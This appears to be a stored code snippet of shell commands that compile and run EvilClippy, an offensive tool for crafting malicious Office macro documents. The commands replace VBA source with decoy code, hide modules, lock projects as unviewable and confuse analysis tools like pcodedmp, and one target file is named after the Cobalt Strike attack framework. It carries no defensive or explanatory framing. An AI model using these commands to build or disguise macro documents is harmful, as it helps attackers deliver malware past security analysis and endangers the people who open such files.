---
id: d34a38e3-bade-4366-a648-47b8dec5ed2e
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:23.824437+00:00'
updated_at: '2023-04-10T20:36:56.684908+00:00'
---

# Code Snippet d34a38e3

**Language**: ps1

```ps1
# OSX/Linux
mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 
# Windows
csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 

EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc
EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc
EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc

# make macro code unaccessible is to mark the project as locked and unviewable: -u
# Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag.
EvilClippy.exe -r macrofile.doc
```
